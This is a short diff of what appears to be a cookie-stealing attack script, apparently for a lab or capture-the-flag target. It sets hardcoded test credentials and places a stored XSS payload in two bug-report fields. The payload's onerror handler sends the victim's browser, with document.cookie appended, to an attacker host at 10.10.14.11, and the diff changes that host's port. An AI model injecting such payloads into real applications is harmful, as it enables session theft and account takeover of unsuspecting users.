@@ -26,8 +26,8 @@ USERNAME = "username"
 PASSWORD = "pass1234"
 
 # XSS payload
-BUG_NAME = '<img src=1 onerror="document.location=\'http://10.10.14.11:8080/give_me_the_cookie\'+ document.cookie">'
-BUG_DETAILS = "XSS Vulnerability in the <name> field"
+BUG_NAME = '<img src=1 onerror="document.location=\'http://10.10.14.11:80/give_me_the_cookie\'+ document.cookie">'
+BUG_DETAILS = '<img src=1 onerror="document.location=\'http://10.10.14.11:80/give_me_the_cookie\'+ document.cookie">'
 
 
 # Helper functions
